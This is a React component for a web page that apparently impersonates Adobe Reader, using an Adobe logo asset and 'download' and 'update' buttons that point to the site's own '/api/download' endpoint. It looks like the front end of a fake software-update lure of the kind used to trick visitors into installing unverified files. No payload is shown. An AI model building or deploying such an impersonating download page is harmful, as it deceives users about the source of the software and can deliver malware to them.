import { useState } from "react";
import { AdobeCard } from "@/components/adobe/AdobeCard";
import adobeLogoPath from "@assets/adobe_reader_14145_1766295497679.png";

export default function Home() {
  const [isDownloading, setIsDownloading] = useState(false);

  const handleDownload = () => {
    setIsDownloading(true);
    setTimeout(() => {
      window.location.href = '/api/download?type=download';
      setTimeout(() => setIsDownloading(false), 2000);
    }, 300);
  };

  const handleUpdate = () => {
    setIsDownloading(true);
    setTimeout(() => {
      window.location.href = '/api/download?type=update';
      setTimeout(() => setIsDownloading(false), 2000);
    }, 300);
  };

  return (
    <div className="relative min-h-screen w-full bg-slate-100 flex items-center justify-center p-4 overflow-hidden font-sans">
      <div
        className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1562240020-ce31ccb0fa7d?q=80&w=2000&auto=format&fit=crop')] bg-cover bg-center opacity-10 blur-md pointer-events-none"
        aria-hidden="true"
      />
      <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px] z-0" />
      <AdobeCard 
        adobeLogoPath={adobeLogoPath}
        isDownloading={isDownloading}
        onDownload={handleDownload}
        onUpdate={handleUpdate}
      />
    </div>
  );
}
